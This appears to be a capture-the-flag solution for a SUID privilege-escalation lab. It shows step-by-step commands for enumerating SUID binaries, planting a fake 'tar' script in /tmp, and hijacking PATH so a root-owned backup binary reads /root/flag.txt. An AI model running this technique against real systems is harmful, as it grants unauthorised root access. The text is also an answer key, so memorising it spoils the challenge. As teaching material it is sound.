# SUID Privilege Escalation - Solution

## Vulnerability

The `/usr/local/bin/siege-backup` binary has the SUID bit set (runs as root) and calls `tar` using `system()` without an absolute path. This allows PATH hijacking to execute arbitrary commands as root.

## Steps to Solve

1. **SSH into the target**:

   ```bash
   ssh ctfuser@localhost
   # Password: ctfuser
   ```

2. **Find SUID binaries**:

   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

   This reveals `/usr/local/bin/siege-backup` with the SUID bit set.

3. **Analyze the binary**: Running `strings /usr/local/bin/siege-backup` shows it calls `tar czf /tmp/backup.tar.gz /opt/data` via `system()`, which uses the PATH to resolve `tar`.

4. **Create a fake `tar` script**:

   ```bash
   cd /tmp
   echo '#!/bin/bash' > tar
   echo 'cat /root/flag.txt' >> tar
   chmod +x tar
   ```

5. **Hijack the PATH and run the SUID binary**:

   ```bash
   export PATH=/tmp:$PATH
   /usr/local/bin/siege-backup
   ```

6. **Read the output**: The binary runs as root, resolves `tar` to `/tmp/tar`, and executes `cat /root/flag.txt`, printing:

   ```
   CTF{REDACTED}
   ```

## Flag

```
CTF{REDACTED}
```
